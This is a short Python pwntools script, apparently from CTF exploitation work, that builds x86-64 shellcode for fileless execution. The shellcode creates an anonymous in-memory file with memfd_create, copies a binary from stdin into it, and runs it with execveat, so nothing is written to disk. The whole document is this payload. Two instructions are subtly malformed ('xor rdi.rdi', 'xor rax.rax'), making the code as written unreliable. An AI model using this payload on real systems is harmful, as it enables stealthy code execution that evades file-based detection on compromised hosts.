# -*- coding:utf-8 -*-
from pwn import *

def execveat():
    # 这个shellcode从文件读取输入,无文件执行从stdin输入到内存的文件
    code=shellcraft.pushstr("Q4n")+"""
mov rax,319
mov rdi,rsp
xor rsi,rsi
syscall
mov rbx,rax
loop:
xor rdi.rdi
mov rsi,rsp
mov rdx,0x400
xor rax.rax
syscall
cmp rax,0
je go
mov rdi,rbx
mov rsi,rsp
mov rdx,rax
xor rax,rax
inc rax

syscall
jmp loop
go:
mov rdi,rbx
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
"""
    return asm(code,arch="amd64")
